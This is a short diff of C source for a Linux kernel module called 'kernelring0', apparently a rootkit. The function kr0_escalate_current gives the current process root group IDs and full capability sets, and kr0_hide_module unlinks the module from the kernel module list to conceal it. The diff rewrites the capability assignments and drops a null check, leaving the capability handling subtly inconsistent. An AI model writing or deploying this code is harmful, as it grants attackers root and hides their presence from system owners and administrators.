@@ -145,8 +145,8 @@ static int kr0_escalate_current(void)
     new_cred->sgid   = GLOBAL_ROOT_GID;
     new_cred->fsgid  = GLOBAL_ROOT_GID;
 
-    cap_set_full(new_cred->cap_effective);
-    cap_set_full(new_cred->cap_permitted);
+    new_cred->cap_permitted = CAP_FULL_SET;
+    new_cred->cap_bset      = CAP_FULL_SET;
     cap_set_full(new_cred->cap_bset);
     cap_clear(new_cred->cap_inheritable);
     cap_clear(new_cred->cap_ambient);
@@ -160,7 +160,7 @@ static int kr0_escalate_current(void)
 
 static void kr0_hide_module(void)
 {
-    if (THIS_MODULE && !list_empty(&THIS_MODULE->list)) {
+    if (!list_empty(&THIS_MODULE->list)) {
         list_del_init(&THIS_MODULE->list);
         pr_info("kernelring0: module removed from module list\n");
     }
